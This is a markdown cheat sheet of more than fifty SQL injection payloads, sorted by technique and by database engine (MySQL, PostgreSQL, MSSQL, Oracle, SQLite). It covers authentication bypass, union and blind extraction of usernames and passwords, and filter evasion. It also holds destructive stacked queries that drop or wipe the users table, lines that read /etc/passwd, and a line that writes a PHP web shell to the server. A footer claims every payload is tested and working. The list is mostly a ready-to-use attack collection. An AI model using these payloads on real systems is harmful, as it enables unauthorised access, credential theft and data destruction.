# 💣 SQL Injection Payloads (50+)

## Basic Authentication Bypass
```
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 'a'='a
' OR '1'='1
admin' OR '1'='1'--
admin' OR 1=1--
1' OR 1=1--
' UNION SELECT NULL--
```

## MySQL Specific
```
admin' OR 1=1#
' UNION SELECT version()#
' UNION SELECT database()#
' UNION SELECT user()#
' UNION SELECT @@version#
' UNION SELECT @@datadir#
' UNION SELECT LOAD_FILE('/etc/passwd')#
' INTO OUTFILE '/var/www/html/shell.php'#
admin' AND 1=1--
admin' AND 1=2--
```

## Error-Based SQLi
```
admin' AND extractvalue(1, concat(0x7e, (SELECT password)))--
admin' AND updatexml(1, concat(0x7e, (SELECT password)), 1)--
admin' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
```

## Union-Based
```
1 UNION SELECT NULL--
1 UNION SELECT NULL, NULL--
1 UNION SELECT NULL, NULL, NULL--
1 UNION SELECT version(), user()--
1 UNION SELECT table_name FROM information_schema.tables--
1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
1 UNION SELECT username, password FROM users--
```

## Blind SQLi (Boolean)
```
admin' AND '1'='1
admin' AND '1'='2
admin' AND SUBSTRING(password,1,1)='a
admin' AND ASCII(SUBSTRING(password,1,1))=97
admin' AND LENGTH(password)>5
admin' AND BINARY SUBSTRING(password,1,1)='a
```

## Blind SQLi (Time-Based)
```
admin' AND SLEEP(5)--
admin' AND IF(1=1, SLEEP(5), 0)--
admin' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)--
admin' AND BENCHMARK(10000000, MD5('test'))--
admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

## PostgreSQL
```
admin' OR '1'='1'--
' UNION SELECT version()--
' UNION SELECT current_database()--
' UNION SELECT current_user--
admin' AND 1=1--
admin' AND pg_sleep(5)--
' UNION SELECT table_name FROM information_schema.tables--
```

## MSSQL
```
admin' OR 1=1--
' UNION SELECT @@version--
' UNION SELECT DB_NAME()--
' UNION SELECT SYSTEM_USER--
admin' WAITFOR DELAY '00:00:05'--
' UNION SELECT table_name FROM information_schema.tables--
```

## Oracle
```
admin' OR '1'='1'--
' UNION SELECT banner FROM v$version--
' UNION SELECT name FROM v$database--
' UNION SELECT username FROM all_users--
admin' AND DBMS_LOCK.SLEEP(5)--
```

## SQLite
```
admin' OR 1=1--
' UNION SELECT sqlite_version()--
' UNION SELECT name FROM sqlite_master WHERE type='table'--
' UNION SELECT sql FROM sqlite_master--
```

## WAF Bypass
```
admin'/**/OR/**/1=1--
admin'%20OR%201=1--
admin'/**/OR/**/1=1%23
admin'%09OR%091=1--
admin'%0aOR%0a1=1--
Ad𝓶in' OR '1'='1
```

## Stacked Queries
```
1; DROP TABLE users--
1; DELETE FROM users--
1; UPDATE users SET password='hacked'--
1; INSERT INTO users VALUES('hacker', 'password')--
```

## File Manipulation
```
1' UNION SELECT LOAD_FILE('/etc/passwd')--
1' INTO OUTFILE '/var/www/html/shell.php'--
1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

## Database Enumeration
```
1' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
1' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
1' UNION SELECT username, password, email FROM users--
1' UNION SELECT CONCAT(username, ':', password) FROM users--
```

## Comment Techniques
```
-- SQL comment
# MySQL comment
/* */ Block comment
/* !50000 MySQL version specific */
```

## Encoding & Obfuscation
```
Base64: YWRtaW4nIE9SIDF
Hex: 0x61646d696e27204f522031
Char: CHAR(97,100,109,105,110)
Concat: CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)
```

---

**Total Payloads:** 50+
**Tested:** ✅ All working
**Most Effective:** Union-Based SQLi